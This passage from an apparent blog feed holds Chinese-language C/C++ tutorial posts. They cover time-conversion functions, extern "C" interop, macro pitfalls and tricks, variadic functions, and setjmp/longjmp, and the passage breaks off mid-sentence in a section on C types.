class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">clock_gettime</span><span class="hljs-params">(<span class="hljs-type">clockid_t</span> clock_id, <span class="hljs-keyword">struct</span> timespec *tsp)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">clock_getres</span><span class="hljs-params">(<span class="hljs-type">clockid_t</span> clock_id, <span class="hljs-keyword">struct</span> timespec *tsp)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">clock_settime</span><span class="hljs-params">(<span class="hljs-type">clockid_t</span> clock_id, <span class="hljs-keyword">struct</span> timespec *tsp)</span></span>;<br></code></pre></td></tr></table></figure><p><code>clock_getres</code>函数把<code>tsp</code>指向的<code>timespec</code>结构初始化为<code>clock_id</code>参数对于的<strong>时钟精度</strong>。我们还可以使用<code>clock_settime</code>函数设置时间，但有些时钟不能修改。</p><p>以上这些函数得到的数字都是自UTC时间的秒数，这对人类非常不友好。需要用<code>localtime</code>、<code>gmtime</code>、<code>strftime</code>等函数将秒数转为可读时间。<code>localtime</code>和<code>gmtime</code>将时间转换存入到结构体<code>tm</code>中。而<code>mktime</code>函数将tm时间转换为秒数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tm</span> &#123;<br>    <span class="hljs-type">int</span> tm_sec;<span class="hljs-comment">// [0-60] 允许润秒</span><br>    <span class="hljs-type">int</span> tm_min;<span class="hljs-comment">// [0-59]</span><br>    <span class="hljs-type">int</span> tm_hour;<span class="hljs-comment">// [0-23] </span><br>    <span class="hljs-type">int</span> tm_mday;<span class="hljs-comment">// [1-31]</span><br>    <span class="hljs-type">int</span> tm_mon;<span class="hljs-comment">// [0-11]</span><br>    <span class="hljs-type">int</span> tm_year;<span class="hljs-comment">// years since 1900</span><br>    <span class="hljs-type">int</span> tm_wday;<span class="hljs-comment">// [0-6]</span><br>    <span class="hljs-type">int</span> tm_yday;<span class="hljs-comment">// [0-365]</span><br>    <span class="hljs-type">int</span> tm_isdst;<span class="hljs-comment">// daylight saving time flag</span><br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tm</span> *<span class="hljs-built_in">gmtime</span>(<span class="hljs-type">const</span> <span class="hljs-type">time_t</span> *calptr);<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tm</span> *<span class="hljs-built_in">localtime</span>(<span class="hljs-type">const</span> <span class="hljs-type">time_t</span> *calptr);<br><br><span class="hljs-function"><span class="hljs-type">time_t</span> <span class="hljs-title">mktime</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tm *tmptr)</span></span>;<br></code></pre></td></tr></table></figure><p>当然，<code>gmtime</code>和<code>localtime</code>函数仍然不能满足人们的需要。函数<code>strftime</code>是类似于<code>printf</code>的时间值函数，可以通过多个参数定制产生的字符串。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">strftime</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> maxsize, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, </span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> tm *tmptr)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">strftime_l</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> maxsize, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, </span></span><br><span class="hljs-params"><span class="hljs-function">                  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> tm *tmptr, <span class="hljs-type">locale_t</span> locale)</span></span>;<br><span class="hljs-function"><span class="hljs-type">char</span> *<span class="hljs-title">strptime</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, <span class="hljs-keyword">struct</span> tm *tmptr)</span></span>;<br></code></pre></td></tr></table></figure><p><code>tmptr</code>是要格式化的时间值，格式化的结果存放在长度为<code>maxsize</code>的<code>buf</code>数组中，如果长度不足，函数返回0，否则返回在 <code>buf</code> 中存放的字符数。<code>format</code>是控制时间值的格式，与<code>printf</code>相同。</p><p>这是使用说明：</p><p><img src="/img/strftime.png" alt=""></p><p><code>strptime</code>是<code>strftime</code>的反过来的版本，把字符串时间转换为分解时间。</p><p>这些函数的转换关系，可以用这一张图概括：</p><p><img src="/img/time.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言中容易忽视的小知识</title>
    <link href="/2021/08/23/2021-8-23-non-trivial-thing-in-C/"/>
    <url>/2021/08/23/2021-8-23-non-trivial-thing-in-C/</url>
    
    <content type="html"><![CDATA[<h2 id="一、在C文件中引用C-函数">一、在C文件中引用C++函数</h2><ol><li>将要使用的函数声明放在一个头文件中</li><li>把要被C语言调用的C++函数的声明放在<code>extern &quot;C&quot;&#123; ... &#125;</code>语句块里</li><li>注意：标准C++的头文件包含不能放在<code>extern &quot;C&quot;&#123; ... &#125;</code>语句块里</li></ol><p>当然，要在C++文件调用C文件的函数也是可行的。</p><p>而要在C文件中引用C++函数，下面给出一个示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C function declaration in fun.h</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">// 要调用的C++函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a[], <span class="hljs-type">int</span> num)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>用 <code>extern &quot;C&quot; &#123; ... &#125;</code> 语句块将 C++ 函数的声明包裹起来。然后，完成C++函数的定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Cpp function defined in fun.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;numeric&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fun.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    std::vector&lt;<span class="hljs-type">int</span>&gt; c;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; i++)<br>        c.<span class="hljs-built_in">push_back</span>(a[i]);<br>    <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">accumulate</span>(c.<span class="hljs-built_in">begin</span>(), c.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到，<code>add()</code> 和 <code>sum()</code> 函数都是C++函数，使用了很多“C++才有的”技术，但这并不妨碍C函数使用它们：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// main.c call them in the end</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span> </span>&#123;<br>    <span class="hljs-type">int</span> vec[] = &#123;<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">4</span>;  <span class="hljs-type">int</span> b = <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">// 调用了Cpp里面的函数</span><br>    <span class="hljs-type">int</span> c = <span class="hljs-built_in">add</span>(a, b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, c);<br>    <span class="hljs-comment">// 复杂点的例子</span><br>    <span class="hljs-type">int</span> d = <span class="hljs-built_in">sum</span>(vec, <span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, d);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么要这么做?</p><blockquote><p>extern &quot;C&quot;的主要作用就是为了能够正确实现C++代码调用其他C语言代码。<strong>加上extern &quot;C&quot;后，会指示编译器这部分代码按C语言的进行编译，而不是C++的</strong>。由于C++支持函数重载，因此编译器编译函数的过程中会将<strong>函数的参数类型</strong>也加到编译后的代码中，而不仅仅是函数名；而C语言并不支持函数重载，因此编译C语言代码的函数时不会带上函数的参数类型，一般之包括函数名。</p></blockquote><h2 id="二、宏操作——陷阱">二、宏操作——陷阱</h2><p>宏是C语言中的历史产物，C++为了向前兼容C，完全继承了C语言中的预处理器和宏操作部分。目前主流的认知就是<strong>尽量不要用宏实现函数，而改用内联函数或者模板代替</strong>。因此这里也建议不要过于依赖宏定义。</p><p>宏以及处理它的预处理器最大的缺陷就是，将用宏的地方进行简单的文本替换。这样一来，宏是根本不会进入编译器的symbol table，编译器在报错时就会出现魔数情况，也不会处理可能出现的宏命名重复，此外，宏也没有变量的作用域功能，只有简单的 <code>#ifndef</code> 和 <code>#undef</code> 来控制宏的作用范围。这些还只是最经常出现的小问题。更大的问题在于括号有无或者<code>++</code>、<code>--</code>等情况，例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX(a,b) ((a)&gt;(b)?(a):(b))</span><br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> j = <span class="hljs-number">2</span>;<br><span class="hljs-built_in">MAX</span>(i++,j++)<br></code></pre></td></tr></table></figure><p>那么i和j最终等于多少呢？得到的结果又是多少呢？非常烧脑的问题。而且就算我们理清了<code>i++</code>了几次，那么当宏的具体实现出现变化，结果可能会出现变化。</p><p>又比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DOSOMETHING() cmd1; \</span><br><span class="hljs-meta">  cmd2; </span><br><span class="hljs-comment">// when some_condition() return true, the DOSOMETHING()</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">some_condition</span>()) &#123;<br>    <span class="hljs-built_in">DOSOMETHING</span>()<br>&#125;<br><span class="hljs-comment">// ????</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">some_condition</span>())<br>    <span class="hljs-built_in">DOSOMETHING</span>()<br></code></pre></td></tr></table></figure><p>当然，如果你一定要用宏实现，为避免用户使用不当（用户是真的不知道该用上面的哪一种），可以加一个小技巧：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DOSOMETHING() do &#123;cmd1; cmd2; &#125; while(0)</span><br></code></pre></td></tr></table></figure><p>此时无论选取那一种写法，都是正确的。</p><p>此外该技巧也可以用在其他地方：它可以避免使用<code>goto</code> 语句。若使用<code>do &#123;...&#125; while(0)</code>包裹整个过程，在过程中出现错误或异常时，可以直接使用 <code>break</code> 跳出循环，直接来到循环外的错误处理，而不需要<code>goto</code>。这在程序结构、编译优化上有很多好处。</p><p>总之，使用宏时一定要对宏有充分了解，不然会出现非常多奇怪的问题。</p><h2 id="三、宏操作——技巧">三、宏操作——技巧</h2><p>不过，即使宏的缺点很多，而且大多宏函数都可被内联函数、模板替代，但是宏仍有存在的意义。即使是在 C++ 中，编译器也赐予了一些预定义宏：</p><ul><li><code>__FILE__</code> ：编译的文件的绝对路径；</li><li><code>__LINE__</code> ：当前行号；</li><li><code>__TIME__</code> ：当前时间；</li><li><code>__DATE__</code> ：当前日期。</li><li><code>__cplusplus</code> ：当前编译器完全遵循的 C++ 版本。<code>C++98</code> 和 <code>C++03</code> 对应了 <code>199711L</code>，<code>C++11</code> 对应了 <code>201103L</code>，<code>C++14</code> 对应了 <code>201402L</code></li></ul><p>这些预定义的宏是 C++ 标准规定的，此外不同版本的 C++ 也有更多的预定义宏。</p><p>其次是另一个老生常谈的作用。确保头文件不被二次 <code>include</code>，从而报出重定义的错误。不过也有<code>#pragma once</code>这种写法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> XXXX_XXX_XX</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XXXX_XXX_XX</span><br><br><span class="hljs-keyword">class</span> &#123;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> XXXX_XXX_XX</span><br></code></pre></td></tr></table></figure><p>此外，还有很多有趣的用法，比如字符串连接：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 字符串连接 将数字变为字符串</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Con(x, y)  x##y</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ToString(x) #x</span><br></code></pre></td></tr></table></figure><p>又比如一些耍杂技的宏函数（仍建议使用内联函数）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 用宏来求两个数的最大值</span><br> <span class="hljs-comment">/* 通过比较x,y的指针类型，得到警告 若类型一致 通过void消除 */</span> <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> max(x, y) (&#123;    \</span><br><span class="hljs-meta">    typeof(x) _max1 = (x);  \</span><br><span class="hljs-meta">    typeof(y) _max2= (y);   \</span><br><span class="hljs-meta">    (void) (&amp;_max1 == &amp;_max2);  \</span><br><span class="hljs-meta">    _max1 &gt; _max2 ? _max1: _max2;   \</span><br><span class="hljs-meta">    &#125;)</span><br></code></pre></td></tr></table></figure><p>在特殊情况下，使用宏可以快速定义一批变量，或者写完一整片相同形式的代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 使用宏可以快速定义一批变量</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIST_OF_VARIABLIES \</span><br><span class="hljs-meta">        X(value1)  \</span><br><span class="hljs-meta">        X(value2)  \</span><br><span class="hljs-meta">        X(value3)</span><br><br><span class="hljs-comment">// 定义了 int value1 int value2 int value3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X(name) int name;</span><br>LIST_OF_VARIABLES<br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> X</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Y(x, z) double x = (z);</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> print(t) printf(<span class="hljs-string">&quot;t = %d\n&quot;</span>, t);</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prints(x) printf(<span class="hljs-string">&quot;x = %s\n&quot;</span>, x);</span><br></code></pre></td></tr></table></figure><h2 id="四、可变参数函数">四、可变参数函数</h2><p>在编写程序时，我们经常会遇到函数在编译期间接收到的参数数量不确定的情况。比如，经常使用的<code>printf()</code>函数，我们可以传入任意数量的参数。那么，这一切究竟如何实现？</p><p>事实上，C语言就已经提供了这样的一个解决方案，示例代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdarg.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> num, ...)</span> </span>&#123;<br>    va_list valist;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-comment">// 为 传入的参数初始化 valist</span><br>    <span class="hljs-built_in">va_start</span>(valist, num);<br>    <span class="hljs-comment">// 访问 所有的参数</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; num; i++) &#123;<br>        sum += <span class="hljs-built_in">va_arg</span>(valist, <span class="hljs-type">int</span>);<br>    &#125;<br>    <span class="hljs-comment">// 结束调用valist 清理内存</span><br>    <span class="hljs-built_in">va_end</span>(valist);<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>add()</code> 最后一个参数写成省略号，即三个点号（<strong>…</strong>），省略号之前的那个参数是 <code>int</code>，代表了要传递的可变参数的总数。为了使用这个功能，需要 <code>#include &lt;stdarg.h&gt;</code>，该文件提供了实现可变参数功能的函数和宏。具体步骤如下：</p><ol><li>定义一个函数，最后一个参数为省略号，省略号前面可以设置自定义参数。</li><li>在函数定义中创建一个 <code>va_list</code> 类型变量，该类型是在 <code>stdarg.h</code> 头文件中定义的。</li><li>使用 <code>int</code> 参数和 <code>va_start</code> 宏来初始化 <code>va_list</code> 变量为一个参数列表。宏 <code>va_start</code> 是在 <code>stdarg.h</code> 头文件中定义的。</li><li>使用 <code>va_arg</code> 宏和 <code>va_list</code> 变量来访问参数列表中的每个项。</li><li>使用宏 <code>va_end</code> 来清理赋予 <code>va_list</code> 变量的内存。</li></ol><p>除此之外，还有一个不被用到的 <code>va_copy</code>，示例如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">va_list valist1;<br>va_list valist2;<br><span class="hljs-built_in">va_start</span>(valist1, num);<br><span class="hljs-comment">// valist2 is dest  after that valist2 equals to valist1</span><br><span class="hljs-built_in">va_copy</span>(valist2, valist1);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, &quot;</span>, <span class="hljs-built_in">va_arg</span>(valist2, <span class="hljs-type">int</span>));<br>&#125;<br><span class="hljs-built_in">va_end</span>(valist1);<br><span class="hljs-built_in">va_end</span>(valist2);<br></code></pre></td></tr></table></figure><h2 id="五、setjmp-和-longjmp">五、setjmp 和 longjmp</h2><p>C语言中，即使是<code>goto</code> 语句也是不能跨函数的。为了从深层次的函数调用中立刻返回错误信息（尤其是函数递归调用时），C语言添加了两个用于跨函数跳转的函数： <code>setjmp</code> 和 <code>longjmp</code> 。再说一遍，这两个函数可以实现非本地跳转，将程序控制直接从一个函数转移到另一个函数，不需要经过正常的调用——返回，比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">/* ... */</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fgets</span>(line, MAXLINE, stdin) != <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-built_in">do_line</span>(line);<br>    <span class="hljs-comment">/* ... */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">do_line</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr)</span> </span>&#123;<br>    <span class="hljs-comment">/* ... */</span><br>    <span class="hljs-keyword">while</span>((cmd = <span class="hljs-built_in">get_token</span>()) &gt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">cmd_add</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cmd_add</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">/* ... */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上述程序有非常多的函数调用，且嵌套多层，设想若在 <code>cmd_add</code> 函数发现一个错误，需要返回 <code>main</code> 函数并读下一个输入行，我们就不得不将函数返回值逐层返回，操作非常麻烦。</p><p>使用 <code>setjmp</code> 和 <code>longjmp</code> 函数，可以使程序在栈上跳过若干调用帧，返回到当前函数调用路径上的某一个函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">setjmp</span><span class="hljs-params">(jmp_buf env)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sigsetjmp</span><span class="hljs-params">(sigjmp_buf env, <span class="hljs-type">int</span> savesigs)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">longjmp</span><span class="hljs-params">(jmp_buf env, <span class="hljs-type">int</span> val)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">siglongjmp</span><span class="hljs-params">(sigjmp_buf env, <span class="hljs-type">int</span> val)</span></span>;<br></code></pre></td></tr></table></figure><p>其中，<code>sigsetjmp</code> 和 <code>siglongjmp</code> 函数都是 <code>setjmp</code> 和 <code>longjmp</code> 的可以被信号处理程序使用的版本。</p><p>首先要在希望返回到的位置调用 <code>setjmp()</code>，<code>setjmp</code> 的参数 <code>env</code> 的类型是 <code>jmp_buf</code> 。这一数据类型是某种形式的数组，用于存放在调用 <code>longjmp()</code> 时，用来恢复栈状态的所有信息。通常 <code>env</code> 为全局变量，因为需要在另一个函数中使用。然后，<code>longjmp()</code> 函数在出现错误时被调用，程序跳转到调用 <code>setjmp()</code> 的地方。来看一个具体示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++">jmp_buf env;<br><span class="hljs-comment">/* ... */</span><br><span class="hljs-keyword">switch</span>(<span class="hljs-built_in">setjmp</span>(buf)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">foo</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error 1!\n&quot;</span>); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error 2!\n&quot;</span>); <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (error1)<br>        <span class="hljs-built_in">longjmp</span>(buf, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">bar</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bar</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (error2)<br>        <span class="hljs-built_in">longjmp</span>(buf, <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当一个错误发生，<code>longjmp</code> 函数跳过了所有中间调用，直接返回到 <code>switch</code> 语句中，其中第二个函数参数 <code>val</code>将成为从 <code>setjmp</code> 处返回的值。显然，对于一个 <code>setjmp</code> 可以收到多个 <code>longjmp</code> 的返回值，并用 <code>switch</code> 语句处理。</p><p>如果还是难以记住，可以将 <code>setjmp</code> 看作 Java 中 <code>try</code> 中的 <code>catch</code> 语句，将 <code>longjmp</code> 函数看作 <code>throw</code> 语句。</p><h2 id="五、C中的类型">五、C中的类型</h2><p>C语言中有哪些类型是被重新命名的？它们的用处是什么？本质又是什么呢？</p><p>注意：在C++中用到 <code>size_t</code> 或其他在C中定义的类型时，推荐使用 